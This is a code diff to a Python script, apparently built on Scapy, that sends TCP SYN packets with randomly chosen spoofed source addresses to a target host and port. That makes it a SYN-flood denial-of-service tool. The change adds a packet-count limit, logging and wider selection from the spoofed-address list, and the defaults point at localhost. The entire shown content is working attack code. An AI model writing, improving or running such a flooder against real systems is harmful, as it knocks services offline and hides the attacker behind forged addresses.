@@ -14,15 +14,21 @@ def generate_ip():
 
 
 
-def synFlood(tgt = "127.0.0.1", dport = 8000):
+def synFlood(tgt = "127.0.0.1", dport = 8000, num = 0):
 	srcList = generate_ip()
+	tmp = 0
 	for sPort in range(1024, 65535):
-		index = random.randrange(3)
+		index = random.randrange(len(srcList) - 1)
+		print(index, srcList[index])
 		ipLayer = IP(src = srcList[index], dst = tgt)
 		tcpLayer = TCP(sport = sPort, dport = dport, flags = "S")
 		packet = ipLayer / tcpLayer
 		send(packet)
+		if num != 0:
+			tmp = tmp + 1
+			if(tmp == num):
+				break
 		print("send")
 		
 if __name__ == "__main__":
-	synFlood("127.0.0.1", 8000)
+	synFlood("127.0.0.1", 8000, 20)
